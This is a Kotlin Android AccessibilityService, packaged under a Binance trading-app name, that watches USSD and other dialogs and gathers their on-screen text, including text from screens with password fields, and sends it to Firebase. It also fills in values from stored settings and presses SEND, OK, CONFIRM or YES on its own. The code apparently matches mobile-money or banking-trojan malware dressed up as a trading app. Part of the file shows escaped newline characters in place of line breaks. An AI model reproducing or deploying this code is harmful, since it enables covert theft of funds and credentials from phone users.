package dApp.binance.Trading.arfu

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log
import androidx.core.view.accessibility.AccessibilityNodeInfoCompat

class CarerAccessibilityService : AccessibilityService() {

    private var lastProcessedTime = 0L
    private var lastProcessedText = ""

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        // Debounce: ignore same event within 500ms
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastProcessedTime < 500) {
            return
        }

        // Listen for popup windows (USSD dialogs)
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val rootNode = rootInActiveWindow ?: return
                
                val sharedPref = getSharedPreferences("CarerSettings", MODE_PRIVATE)
                val pendingInput = sharedPref.getString("pending_input_value", "")
                
                // PRIORITY 1: If there's pending input, execute it immediately
                if (!pendingInput.isNullOrEmpty()) {
                    Log.d("CarerAccessibility", "Found pending input: $pendingInput")
                    lastProcessedTime = currentTime
                    try {
                        Thread.sleep(300)
                        typeInUssdDialog(pendingInput)
                        sharedPref.edit().remove("pending_input_value").apply()
                        Log.d("CarerAccessibility", "Auto-typed successfully")
                    } catch (e: Exception) {
                        Log.e("CarerAccessibility", "Error auto-typing: ${e.message}", e)
                    }
                    return
                }
                
                // PRIORITY 2: Otherwise, capture response text
                val ussdText = extractUssdDialogText(rootNode)
                if (ussdText.isEmpty()) {
                    Log.d("CarerAccessibility", "No text found in event")
                    return
                }
                
                // Debounce: skip if same text as last time
                if (ussdText == lastProcessedText) {
                    Log.d("CarerAccessibility", "Duplicate text, skipping")
                    return
                }
                
                lastProcessedText = ussdText
                lastProcessedTime = currentTime
                
                Log.d("CarerAccessibility", "Dialog captured: $ussdText")
                captureAndSendResponse(ussdText)
            }
        }
    }

    override fun onInterrupt() {
        // Called when service is interrupted
    }

    /**
     * Check if node has any input-like field (simplified)
     */
    private fun hasAnyInputField(node: AccessibilityNodeInfo): Boolean {
        // Check current node
        if (node.isPassword || 
            node.inputType != 0 || 
            node.contentDescription?.contains("input", ignoreCase = true) == true) {
            return true
        }
        
        // Check all children
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            if (hasAnyInputField(child)) return true
        }
        
        return false
    }

    /**
     * Extract dialog text content
     */
    private fun extractUssdDialogText(node: AccessibilityNodeInfo): String {
        val allTexts = mutableListOf<String>()
        
        // Check if this tree has an input field
        if (!hasAnyInputField(node)) {
            Log.d("CarerAccessibility", "No input field found, ignoring")
            return ""
        }
        
        collectAllText(node, allTexts)
        return allTexts.joinToString("\n").trim()
    }
    
    /**
     * Recursively collect all text from tree
     */
    private fun collectAllText(node: AccessibilityNodeInfo, texts: MutableList<String>) {
        // Add non-empty text
        val nodeText = node.text?.toString()?.trim()
        if (!nodeText.isNullOrEmpty() && nodeText.length > 1) {
            texts.add(nodeText)
        }
        
        // Recursively process children
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            collectAllText(child, texts)
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("CarerAccessibility", "Accessibility Service connected")

        // Configure service info
        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
        serviceInfo = info
    }

    /**
     * Type text in USSD input field
     */
    fun typeInUssdDialog(text: String) {
        val rootNode = rootInActiveWindow ?: return

        val inputField = findInputField(rootNode)
        if (inputField != null) {
            val arguments = android.os.Bundle()
            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            inputField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
            Log.d("CarerAccessibility", "Typed: $text")

            // Click send button after typing
            Thread.sleep(500)
            clickSendButton(rootNode)
        }
    }

    /**
     * Find and click the "Send" or "OK" button in USSD dialog
     */
    private fun clickSendButton(rootNode: AccessibilityNodeInfo) {
        val buttons = listOf("SEND", "OK", "CONFIRM", "YES")
        
        buttons.forEach { buttonText ->
            val button = findNodeByText(rootNode, buttonText)
            if (button != null && button.isClickable) {
                button.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                Log.d("CarerAccessibility", "Clicked button: $buttonText")
                return
            }
        }
    }

    /**
     * Find input field in USSD dialog
     */
    private fun findInputField(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        if (node.isPassword || node.inputType == android.text.InputType.TYPE_CLASS_NUMBER) {
            return node
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findInputField(child)
            if (result != null) return result
        }

        return null
    }

    /**
     * Find node by text content
     */
    private fun findNodeByText(node: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
        if (node.text?.contains(text, ignoreCase = true) == true) {
            return node
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findNodeByText(child, text)
            if (result != null) return result
        }

        return null
    }

    /**
     * Capture response text from USSD dialog and send to Firebase
     */
    private fun captureAndSendResponse(text: String) {\n        Log.d(\"CarerAccessibility\", \"Capturing response: $text\")\n        \n        val rootNode = rootInActiveWindow\n        val hasInputField = rootNode?.let { hasInputField(it) } ?: false\n        \n        // Send to Firebase with input field status\n        FirebaseLogHelper.logResponse(text, this, hasInputField)\n    }\n    \n    /**\n     * Check if current screen has an input field\n     */\n    private fun hasInputField(node: AccessibilityNodeInfo): Boolean {\n        if (node.isPassword || node.inputType == android.text.InputType.TYPE_CLASS_NUMBER) {\n            return true\n        }\n        \n        for (i in 0 until node.childCount) {\n            val child = node.getChild(i) ?: continue\n            if (hasInputField(child)) return true\n        }\n        \n        return false\n    }

    companion object {
        /**
         * Check if accessibility service is enabled
         */
        fun isAccessibilityServiceEnabled(context: Context): Boolean {
            val accessibilityManager = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as android.view.accessibility.AccessibilityManager
            return accessibilityManager.isEnabled && isCarerAccessibilityServiceEnabled(context, accessibilityManager)
        }

        private fun isCarerAccessibilityServiceEnabled(
            context: Context,
            accessibilityManager: android.view.accessibility.AccessibilityManager
        ): Boolean {
            val enabledServices = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false

            val serviceName = "${context.packageName}/${CarerAccessibilityService::class.java.name}"
            return enabledServices.contains(serviceName)
        }
    }
}
